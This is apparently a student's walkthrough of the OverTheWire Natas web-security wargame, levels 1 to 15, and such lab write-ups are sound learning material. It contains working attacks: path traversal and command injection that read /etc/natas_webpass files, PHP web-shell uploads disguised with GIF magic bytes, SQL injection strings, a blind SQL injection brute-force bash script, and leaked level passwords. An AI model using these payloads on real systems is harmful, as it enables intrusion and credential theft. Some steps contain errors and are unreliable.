# Level 1
Solution:
after you open link, open inspector check html code there you can find password

# Level 2
So solution in this case is a bit hard to explain but basicly 
You should find an image tag like `<img src="file/pixel.png>` now you see that comes from database with this link `file/pixel.png` 
it means that you should you it as vulnerabilities to get key this is how:
`http://natas2.natas.labs.overthewire.org/files/`
there you find password for the next level

# Level 3
So get key from this problem we sould search for (google robots)[https://developers.google.com/search/docs/crawling-indexing/robots/create-robots-txt].
Bassicaly its `robots.txt` file that locks or allows access for all or a specific path to your domain
`http://natas3.natas.labs.overthewire.org/robots.txt` ---> here you get a hidden path `/s3cr3t/` and go to it

`http://natas3.natas.labs.overthewire.org/s3cr3t`--> key should be here

# Level 4
```
curl \                                                                                                                                                                               
  -H "Authorization: Basic $(echo -n 'natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ' | base64)" \
  -H "Referer: http://natas5.natas.labs.overthewire.org/" 
  http://natas4.natas.labs.overthewire.org/     

<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas4", "pass": "QryZXc2e0zahULdHrtHxzyYkj59kUxLQ" };</script></head>
<body>
<h1>natas4</h1>
<div id="content">

Access granted. The password for natas5 is 0n35PkggAPm2zbEpOU802c0x0Msn1ToK #your pass #key to next level
<br/>
<div id="viewsource"><a href="index.php">Refresh page</a></div>
</div>
</body>
</html>
```
# Level 5
```Visiting the website returns the following text: “Access disallowed. You are not logged in”. The website should determine that we are logged in through a cookie. So, by opening the developer tools and going to the ‘Storage’ tab, we can see the ‘Cookies’ section. Here we find a cookie named ’loggedin’ with the value=0. Let’s try changing the value to 1 (by double-clicking on it) and refreshing the page.```

# Level 6 
if you take a look into source code that handles `input` you find something like this 
`include "includes/secret.inc"include "includes/secret.inc"` it means that it inludes another php file to get key from it,
and now we should do it manually `http://natas6.natas.labs.overthewire.org/index-source.html/include/secret.inc` its just a white/black screen 
check inspector and you find key

# Level 7 

Level 7 is bassically same as Level 6
  * take a look into source code
  * you will find something like this ` hint: password for webuser natas8 is in /etc/natas_webpass/natas8`
  * and go this link via page `http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8`

# Level 8 

Level 8 is same as level 6 but pin-code placed in the script you should decode it
```
 echo 3d3d516343746d4d6d6c315669563362 | xxd -r -p

==QcCtmMml1ViV3b #decode hash to bin

echo "==QcCtmMml1ViV3b" | rev #reverse

b3ViV1lmMmtCcQ

echo b3ViV1lmMmtCcQ== | base64 -d

oubWYf2kBq  #key   
```
# Level 9 

so solve this case we should use `comanline injection`
as you could see in source code that input value directly goes through db without any hiccups
`; cat /etc/natas_webpass/natas10 #`--> Key to next level

# Level 10 
Solution in this problem is use another method of injection
`.* cat /etc/natas_webpass/natas11`
 # Level 11
  ----
 # Level 12
 
 In this level you should create a php file on your pc and write own script to get pass
 `<?php echo shell_exec("ls");?>` but dont send it yet you need change in inspector type from jpg to php
 and than upload file it should execute. 
 So ones it worked you should change you script to `<?php echo shell_exec("cat /etc/natas_webpass/natas13");?>` 

 # Level13
 To solve this level we should create the same script in php.

But if you look into source code, you will see some thing like this
 
`else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) echo "File is not an image";`

so this line checks our image type while uploading, and if we just upload our php file we can get error

exif_imagetype() - This PHP function reads the first few bytes of a file, sometimes known as “magic headers” to determine the file type. It won’t be fooled by just changing the file extension. If our file does not begin with the header bytes that indicate it actually is an image file, it will be rejected.

no worries we can buypass it using [magic headers](https://en.wikipedia.org/wiki/List_of_file_signatures?ref=learnhacking.io)

lets pretend to be GIF
```GIF87a<?php echo shell_exec("ls");?>```
And now repeat all that stuff we done in level 12
and you will get KEY

# Level 14
this case is different from others
to solve this we should look into source code

`if(array_key_exists("username", $_REQUEST)) {` 
in this line we can see that form directly works with it means it will do any comand that we can give him,
this method called `sql injection`

How it works (basic idea):
1.A website asks for user input, like a username and password.
2.This input is used directly in an SQL query, like this:
`SELECT * FROM users WHERE username = 'input' AND password = 'input';`
3.If the input is not properly sanitized, an attacker can inject SQL code:
`username = 'admin' -- 
password = anything
`
4.The resulting query becomes:
`SELECT * FROM users WHERE username = 'admin' -- ' AND password = 'anything';`
The -- makes the rest of the query a comment.
5.Now the attacker logs in as admin without knowing the password.

Now you understand how sql injection works:
So to get into the Level14 we should do the same thing

`http://natas14.natas.labs.overthewire.org/?e=1&&username=admin"OR 1=1 --"&&password="admin`

?--->means that we using Get request to get output 

`OR 1=1 --`-->one the basic injection that always returns true(thats how we can bypass password)

# Level 15
In this problem I've discovered something new in this task.

And it is [`Blind SQL Injection`](https://owasp.org/www-community/attacks/Blind_SQL_Injection?ref=learnhacking.io#)

Blind SQL (Structured Query Language) injection is a type of SQL Injection attack that asks the database true or false questions and determines the answer based on the applications response. This attack is often used when the web application is configured to show generic error messages, but has not mitigated the code that is vulnerable to SQL injection.

By knowing that we can create our own randomizer script to get password here how:
```
#!/bin/bash

username="natas15"
password="SdqIqBsFcz3yotlNYErZSZwblkm0lrvx"
url="http://natas15.natas.labs.overthewire.org/index.php"
chars='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
found=""
max_length=36

for ((i=1; i<=max_length; i++)); do
    for c in $(echo -n "$chars" | grep -o .); do
        attempt="${found}${c}"
        payload="username=natas16\" AND BINARY SUBSTRING(password,1,$i)=\"${attempt}\" -- "

        response=$(curl -s -u "$username:$password" \
            --data-urlencode "$payload" \
            "$url")
	
	echo "$payload";

        if echo "$response" | grep -q "This user exists"; then
            found="${found}${c}"
            echo "[+] Found char $i: $c  → $found"
            break
        fi
    done
done

echo "Password: $found"
```
after running this script you'll get password in a short period of time
